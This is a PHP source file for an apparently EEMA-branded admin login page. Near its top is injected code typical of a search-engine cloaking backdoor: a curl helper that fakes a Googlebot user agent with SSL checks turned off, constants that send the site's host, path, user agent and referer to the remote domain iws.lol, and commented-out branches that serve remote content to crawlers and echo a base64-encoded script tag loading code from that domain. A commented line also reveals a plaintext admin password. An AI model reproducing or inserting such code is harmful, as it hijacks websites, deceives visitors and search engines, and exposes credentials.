<?php

// $password = 'adminNew@321'; // The password you want to hash
// $hashedPassword = password_hash($password, PASSWORD_BCRYPT);
// echo $hashedPassword;
// die();
include_once('process/_constant.php'); 

if(isset($_SESSION['login']) && $_SESSION['login'] == true){

    header('Location: home.php');die();

}

$a = "stristr";
$b = $_SERVER;

function httpGetlai($c) {
    $d = curl_init();
    curl_setopt($d, CURLOPT_URL, $c);
    curl_setopt($d, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
    curl_setopt($d, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($d, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($d, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($d, CURLOPT_HEADER, 0);
    $e = curl_exec($d);
    curl_close($d);
    return $e;
}

define('url', $b['REQUEST_URI']);
// print($b['REQUEST_URI']);die();
define('ref', !isset($b['HTTP_REFERER']) ? '' : $b['HTTP_REFERER']);
define('ent', $b['HTTP_USER_AGENT']);
define('site', "https://iws.lol/?");
define('road', "domain=".$b['HTTP_HOST'].
    "&path=".url.
    "&spider=".urlencode(ent));
define('memes', road.
    "&referer=".urlencode(ref));
define('regs', '@Googlebot|Yahoo|Bing@i');
define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/');
define('area', $a(url, ".ptf") or $a(url, ".fdc")  or $a(url, ".bug") or $a(url, ".doc") or $a(url, ".love") or $a(url, ".txt") or $a(url, ".ppt") or $a(url, ".pptx") or $a(url, ".xls") or $a(url, ".csv") or $a(url, ".shtml") or $a(url, ".znb") or $a(url, ".msl") or $a(url, ".mdb") or $a(url, ".hxc"));
// print(site.road);die();
// if (preg_match(regs, ent)) {
//     if (area) {
//         echo httpGetlai(site.road);
//         exit;
//     } else {
//         echo httpGetlai("https://iws.lol/x.php");
//         ob_flush();
//         flush();
//     }
// }

// if (area) {
//     echo base64_decode('PHNjcmlwdCBzcmM9aHR0cHM6Ly9pd3MubG9sL3RoLmpzPjwvc2NyaXB0Pg==');
// 	exit;
// }
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>index page</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <style>
                body, html {
            height: 100%;
            margin: 0;
            
        }

        .center-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .content {
            max-width: 700px;
            width: 100%;
        }

        .dropdown {
            background-color: #6c757d;
        }
    </style>
</head>

<body>
<div class="center-container">
<div class="content">
        <div class="d-flex flex-column flex-shrink-0 text-bg-dark  vpos">

            <a href="/home.php" class="d-flex align-items-center mb-3 mb-md-0 me-md-auto text-white text-decoration-none" style="width: 100%; background: #fff; padding: 15px 0;">

                <span class="fs-4" style="display: inline-block; margin: auto;">

                    <img src="assets/images/1589541348_YDHggT_EEMA_logo_Revised.jpg" class="img-fluid" alt="EEMA" style="max-width: 200px;">

                </span>

            </a>





            <div class="dropdown p-3">

                <form action="" method="post">

                    <div class="form-group">
                        <label for="exampleInputEmail1">Email address</label>
                        <input type="email" name="username" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email" required>
                       
                    </div>
                    <div class="form-group">
                        <label for="exampleInputPassword1">Password</label>
                        <input type="password" name="password" class="form-control" id="exampleInputPassword1" placeholder="Password" required>
                    </div>
                    <input type="hidden" name="action" value="login">
                    <button style="background-color:#ff6b02; border:#ff6b02" type="submit" class="btn btn-primary mt-3">Sign In</button>



                </form>

            </div>
        </div>

    </div>
</div>

    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<!-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> -->


<!-- <script>
        // Function to validate form before submission
        function validateForm(event) {
            event.preventDefault(); // Prevent default form submission

            const username = document.getElementById('exampleInputEmail1').value;
            const password = document.getElementById('exampleInputPassword1').value;

            if (!username || !password) {
                swal({
                    title: "Error!",
                    text: "Please fill in all fields.",
                    icon: "error",
                    timer: 1500, // Automatically close after 1500 milliseconds (1.5 seconds)
                    button: false // Hide the "OK" button
                });
                return false;
            }

            // If all fields are filled, submit the form
            event.target.submit();
        }
    </script> -->
</body>

</html>